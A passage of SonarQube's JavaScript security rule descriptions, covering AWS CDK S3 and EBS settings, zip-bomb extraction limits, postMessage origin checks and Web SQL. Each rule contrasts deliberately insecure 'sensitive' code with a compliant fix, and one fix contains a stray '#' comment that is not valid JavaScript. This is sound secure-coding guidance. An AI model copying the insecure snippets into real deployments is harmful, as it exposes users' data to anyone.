          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6265">
              javascript:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul>
  <li> <code>PUBLIC_READ</code>, <code>PUBLIC_READ_WRITE</code> grant respectively "read" and "read and write" privileges to anyone, either
  authenticated or anonymous (<code>AllUsers</code> group). </li>
  <li> <code>AUTHENTICATED_READ</code> grants "read" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, i.e., to only grant users the necessary permissions for their required tasks. In the
context of canned ACL, set it to <code>PRIVATE</code> (the default one), and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users, either authenticated or anonymous, have read and write permissions with the <code>PUBLIC_READ_WRITE</code> access control:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'bucket', {
    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive
});

new s3deploy.BucketDeployment(this, 'DeployWebsite', {
    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>PRIVATE</code> access control (default), only the bucket owner has the read/write permissions on the bucket and its ACL.</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'bucket', {
    accessControl: s3.BucketAccessControl.PRIVATE
});

new s3deploy.BucketDeployment(this, 'DeployWebsite', {
    accessControl: s3.BucketAccessControl.PRIVATE
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html">AWS CDK version 2</a> - Class Bucket (construct) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6275">
              javascript:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a
href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The disk contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
import { Size } from 'aws-cdk-lib';
import { Volume } from 'aws-cdk-lib/aws-ec2';

new Volume(this, 'unencrypted-explicit', {
      availabilityZone: 'us-west-2a',
      size: Size.gibibytes(1),
      encrypted: false // Sensitive
    });
</pre>
<pre>
import { Size } from 'aws-cdk-lib';
import { Volume } from 'aws-cdk-lib/aws-ec2';

new Volume(this, 'unencrypted-implicit', {
      availabilityZone: 'eu-west-1a',
      size: Size.gibibytes(1),
    }); // Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
import { Size } from 'aws-cdk-lib';
import { Volume } from 'aws-cdk-lib/aws-ec2';

new Volume(this, 'encrypted-explicit', {
      availabilityZone: 'eu-west-1a',
      size: Size.gibibytes(1),
      encrypted: true
    });
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html">Amazon EBS encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6270">
              javascript:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The AWS resource stores or processes sensitive data. </li>
  <li> The AWS resource is designed to be private. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'
import { aws_s3 as s3 } from 'aws-cdk-lib'

const bucket = new s3.Bucket(this, "ExampleBucket")

bucket.addToResourcePolicy(new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: ["s3:*"],
    resources: [bucket.arnForObjects("*")],
    principals: [new iam.AnyPrincipal()] // Sensitive
}))
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'
import { aws_s3 as s3 } from 'aws-cdk-lib'

const bucket = new s3.Bucket(this, "ExampleBucket")

bucket.addToResourcePolicy(new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: ["s3:*"],
    resources: [bucket.arnForObjects("*")],
    principals: [new iam.AccountRootPrincipal()]
}))
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6249">
              javascript:S6249
            </a>
          </td>
          <td>
            <details>
              <p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>
<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It
means that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information. </li>
  <li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enforce HTTPS only access by setting <code>enforceSSL</code> property to <code>true</code></p>
<h2>Sensitive Code Example</h2>
<p>S3 bucket objects access through TLS is not enforced by default:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

const bucket = new s3.Bucket(this, 'example'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

const bucket = new s3.Bucket(this, 'example', {
    bucketName: 'example',
    versioned: true,
    publicReadAccess: false,
    enforceSSL: true
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit">AWS documentation</a> - Enforce encryption
  of data in transit </li>
  <li> <a href="https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5">AWS Foundational Security
  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html">AWS CDK version 2</a> - Bucket </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6245">
              javascript:S6245
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul>
  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul>
      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul>
      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul>
      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li>
    </ul>  </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information. </li>
  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'default'
}); // Sensitive
</pre>
<p>Bucket encryption is disabled by default.</p>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    encryption: s3.BucketEncryption.KMS_MANAGED
});

# Alternatively with a KMS key managed by the user.

new s3.Bucket(this, 'id', {
    encryption: s3.BucketEncryption.KMS_MANAGED,
    encryptionKey: access_key
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html">AWS documentation</a> - Protecting data using
  server-side encryption </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BucketEncryption.html">AWS CDK version 2</a> - BucketEncryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5042">
              javascript:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://github.com/npm/node-tar">tar</a> module:</p>
<pre>
const tar = require('tar');

tar.x({ // Sensitive
  file: 'foo.tar.gz'
});
</pre>
<p>For <a href="https://github.com/cthackers/adm-zip">adm-zip</a> module:</p>
<pre>
const AdmZip = require('adm-zip');

let zip = new AdmZip("./foo.zip");
zip.extractAllTo("."); // Sensitive
</pre>
<p>For <a href="https://stuk.github.io/jszip/">jszip</a> module:</p>
<pre>
const fs = require("fs");
const JSZip = require("jszip");

fs.readFile("foo.zip", function(err, data) {
  if (err) throw err;
  JSZip.loadAsync(data).then(function (zip) { // Sensitive
    zip.forEach(function (relativePath, zipEntry) {
      if (!zip.file(zipEntry.name)) {
        fs.mkdirSync(zipEntry.name);
      } else {
        zip.file(zipEntry.name).async('nodebuffer').then(function (content) {
          fs.writeFileSync(zipEntry.name, content);
        });
      }
    });
  });
});
</pre>
<p>For <a href="https://github.com/thejoshwolfe/yauzl">yauzl</a> module</p>
<pre>
const yauzl = require('yauzl');

yauzl.open('foo.zip', function (err, zipfile) {
  if (err) throw err;

  zipfile.on("entry", function(entry) {
    zipfile.openReadStream(entry, function(err, readStream) {
      if (err) throw err;
      // TODO: extract
    });
  });
});
</pre>
<p>For <a href="https://github.com/maxogden/extract-zip">extract-zip</a> module:</p>
<pre>
const extract = require('extract-zip')

async function main() {
  let target = __dirname + '/test';
  await extract('test.zip', { dir: target }); // Sensitive
}
main();
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://github.com/npm/node-tar">tar</a> module:</p>
<pre>
const tar = require('tar');
const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB

let fileCount = 0;
let totalSize = 0;

tar.x({
  file: 'foo.tar.gz',
  filter: (path, entry) =&gt; {
    fileCount++;
    if (fileCount &gt; MAX_FILES) {
      throw 'Reached max. number of files';
    }

    totalSize += entry.size;
    if (totalSize &gt; MAX_SIZE) {
      throw 'Reached max. size';
    }

    return true;
  }
});
</pre>
<p>For <a href="https://github.com/cthackers/adm-zip">adm-zip</a> module:</p>
<pre>
const AdmZip = require('adm-zip');
const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB
const THRESHOLD_RATIO = 10;

let fileCount = 0;
let totalSize = 0;
let zip = new AdmZip("./foo.zip");
let zipEntries = zip.getEntries();
zipEntries.forEach(function(zipEntry) {
    fileCount++;
    if (fileCount &gt; MAX_FILES) {
        throw 'Reached max. number of files';
    }

    let entrySize = zipEntry.getData().length;
    totalSize += entrySize;
    if (totalSize &gt; MAX_SIZE) {
        throw 'Reached max. size';
    }

    let compressionRatio = entrySize / zipEntry.header.compressedSize;
    if (compressionRatio &gt; THRESHOLD_RATIO) {
        throw 'Reached max. compression ratio';
    }

    if (!zipEntry.isDirectory) {
        zip.extractEntryTo(zipEntry.entryName, ".");
    }
});
</pre>
<p>For <a href="https://stuk.github.io/jszip/">jszip</a> module:</p>
<pre>
const fs = require("fs");
const pathmodule = require("path");
const JSZip = require("jszip");

const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB

let fileCount = 0;
let totalSize = 0;
let targetDirectory = __dirname + '/archive_tmp';

fs.readFile("foo.zip", function(err, data) {
  if (err) throw err;
  JSZip.loadAsync(data).then(function (zip) {
    zip.forEach(function (relativePath, zipEntry) {
      fileCount++;
      if (fileCount &gt; MAX_FILES) {
        throw 'Reached max. number of files';
      }

      // Prevent ZipSlip path traversal (S6096)
      const resolvedPath = pathmodule.join(targetDirectory, zipEntry.name);
      if (!resolvedPath.startsWith(targetDirectory)) {
        throw 'Path traversal detected';
      }

      if (!zip.file(zipEntry.name)) {
        fs.mkdirSync(resolvedPath);
      } else {
        zip.file(zipEntry.name).async('nodebuffer').then(function (content) {
          totalSize += content.length;
          if (totalSize &gt; MAX_SIZE) {
            throw 'Reached max. size';
          }

          fs.writeFileSync(resolvedPath, content);
        });
      }
    });
  });
});
</pre>
<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to
decide if the implementation is secure.</p>
<p>For <a href="https://github.com/thejoshwolfe/yauzl">yauzl</a> module</p>
<pre>
const yauzl = require('yauzl');

const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB
const THRESHOLD_RATIO = 10;

yauzl.open('foo.zip', function (err, zipfile) {
  if (err) throw err;

  let fileCount = 0;
  let totalSize = 0;

  zipfile.on("entry", function(entry) {
    fileCount++;
    if (fileCount &gt; MAX_FILES) {
      throw 'Reached max. number of files';
    }

    // The uncompressedSize comes from the zip headers, so it might not be trustworthy.
    // Alternatively, calculate the size from the readStream.
    let entrySize = entry.uncompressedSize;
    totalSize += entrySize;
    if (totalSize &gt; MAX_SIZE) {
      throw 'Reached max. size';
    }

    if (entry.compressedSize &gt; 0) {
      let compressionRatio = entrySize / entry.compressedSize;
      if (compressionRatio &gt; THRESHOLD_RATIO) {
        throw 'Reached max. compression ratio';
      }
    }

    zipfile.openReadStream(entry, function(err, readStream) {
      if (err) throw err;
      // TODO: extract
    });
  });
});
</pre>
<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to
decide if the implementation is secure.</p>
<p>For <a href="https://github.com/maxogden/extract-zip">extract-zip</a> module:</p>
<pre>
const extract = require('extract-zip')

const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB
const THRESHOLD_RATIO = 10;

async function main() {
  let fileCount = 0;
  let totalSize = 0;

  let target = __dirname + '/foo';
  await extract('foo.zip', {
    dir: target,
    onEntry: function(entry, zipfile) {
      fileCount++;
      if (fileCount &gt; MAX_FILES) {
        throw 'Reached max. number of files';
      }

      // The uncompressedSize comes from the zip headers, so it might not be trustworthy.
      // Alternatively, calculate the size from the readStream.
      let entrySize = entry.uncompressedSize;
      totalSize += entrySize;
      if (totalSize &gt; MAX_SIZE) {
        throw 'Reached max. size';
      }

      if (entry.compressedSize &gt; 0) {
        let compressionRatio = entrySize / entry.compressedSize;
        if (compressionRatio &gt; THRESHOLD_RATIO) {
          throw 'Reached max. compression ratio';
        }
      }
    }
  });
}
main();
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6252">
              javascript:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be versioned. When the S3 bucket is unversioned it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The bucket stores information that require high availability. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    versioned: false // Sensitive
});
</pre>
<p>The default value of <code>versioned</code> is <code>false</code> so the absence of this parameter is also sensitive.</p>
<h2>Compliant Solution</h2>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    versioned: true
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html">AWS documentation</a> - Using versioning in S3 buckets </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html#versioned">AWS CDK version 2</a> - Using versioning in S3
  buckets </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2819">
              javascript:S2819
            </a>
          </td>
          <td>
            <details>
              <p>Cross-origin communication allows different websites to interact with each other. This interaction is typically achieved through mechanisms like
AJAX requests, WebSockets, or postMessage API. However, a vulnerability can arise when these communications are not properly secured by verifying
their origins.</p>
<h2>Why is this an issue?</h2>
<p>Without origin verification, the target website cannot distinguish between legitimate requests from its own pages and malicious requests from an
attacker’s site. The attacker can craft a malicious website or script that sends requests to a target website where the user is already
authenticated.</p>
<p>This vulnerability class is not about a single specific user input or action, but rather a series of actions that lead to an insecure cross-origin
communication.</p>
<h3>What is the potential impact?</h3>
<p>The absence of origin verification during cross-origin communications can lead to serious security issues.</p>
<h4>Data Breach</h4>
<p>If an attacker can successfully exploit this vulnerability, they may gain unauthorized access to sensitive data. For instance, a user’s personal
information, financial details, or other confidential data could be exposed. This not only compromises the user’s privacy but can also lead to
identity theft or financial loss.</p>
<h4>Unauthorized Actions</h4>
<p>An attacker could manipulate the communication between websites to perform actions on behalf of the user without their knowledge. This could range
from making unauthorized purchases to changing user settings or even deleting accounts.</p>
<h2>How to fix it</h2>
<p>When sending a message, avoid using <code>*</code> for the target origin (it means no preference). Instead define it explicitly so the message will
only be dispatched to this URI. When receiving the message, verify the orgin to be sure that it is sent by an authorized sender.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>When sending a message:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
var iframe = document.getElementById("testiframe");
iframe.contentWindow.postMessage("hello", "*"); // Noncompliant: * is used
</pre>
<p>When receiving a message:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
window.addEventListener("message", function(event) { // Noncompliant: no checks are done on the origin property.
  console.log(event.data);
 });
</pre>
<h4>Compliant solution</h4>
<p>When sending a message:</p>
<pre data-diff-id="1" data-diff-type="compliant">
var iframe = document.getElementById("testiframe");
iframe.contentWindow.postMessage("hello", "https://secure.example.com");
</pre>
<p>When receiving a message:</p>
<pre data-diff-id="2" data-diff-type="compliant">
window.addEventListener("message", function(event) {
  if (event.origin !== "http://example.org")
    return;

  console.log(event.data)
});
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> MDN web docs - <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">postMessage API</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/345">CWE-345 - Insufficient Verification of Data Authenticity</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6281">
              javascript:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies or ACLs to be set on a S3 bucket the following booleans settings can be enabled:</p>
<ul>
  <li> <code>blockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li>
  <li> <code>ignorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>
  <li> <code>blockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li>
  <li> <code>restrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li>
</ul>
<p>The other attribute <code>BlockPublicAccess.BLOCK_ACLS</code> only turns on <code>blockPublicAcls</code> and <code>ignorePublicAcls</code>. The
public policies can still affect the S3 bucket.</p>
<p>However, all of those options can be enabled by setting the <code>blockPublicAccess</code> property of the S3 bucket to
<code>BlockPublicAccess.BLOCK_ALL</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>
  <li> These settings are not already enforced to true at the account level. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul>
  <li> <code>blockPublicAcls</code> to <code>True</code> to block new attempts to set public ACLs. </li>
  <li> <code>ignorePublicAcls</code> to <code>True</code> to block existing public ACLs. </li>
  <li> <code>blockPublicPolicy</code> to <code>True</code> to block new attempts to set public policies. </li>
  <li> <code>restrictPublicBuckets</code> to <code>True</code> to restrict existing public policies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>By default, when not set, the <code>blockPublicAccess</code> is fully deactivated (nothing is blocked):</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket'
}); // Sensitive
</pre>
<p>This <code>block_public_access</code> allows public ACL to be set:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    blockPublicAccess: new s3.BlockPublicAccess({
        blockPublicAcls         : false, // Sensitive
        blockPublicPolicy       : true,
        ignorePublicAcls        : true,
        restrictPublicBuckets   : true
    })
});
</pre>
<p>The attribute <code>BLOCK_ACLS</code> only blocks and ignores public ACLs:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ACLS // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>This <code>blockPublicAccess</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public policies:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ALL
});
</pre>
<p>A similar configuration to the one above can be obtained by setting all parameters of the <code>blockPublicAccess</code></p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    blockPublicAccess: new s3.BlockPublicAccess({
        blockPublicAcls         : true,
        blockPublicPolicy       : true,
        ignorePublicAcls        : true,
        restrictPublicBuckets   : true
    })
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html">AWS Documentation</a> - Blocking public
  access to your Amazon S3 storage </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BlockPublicAccess.html">AWS CDK version 2</a> - BlockPublicAccess </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2817">
              javascript:S2817
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p>The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some
browsers. (It is not supported in Firefox or IE.)</p>
<p>Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.</p>
<h3>Noncompliant code example</h3>
<pre>
var db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024);  // Noncompliant
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
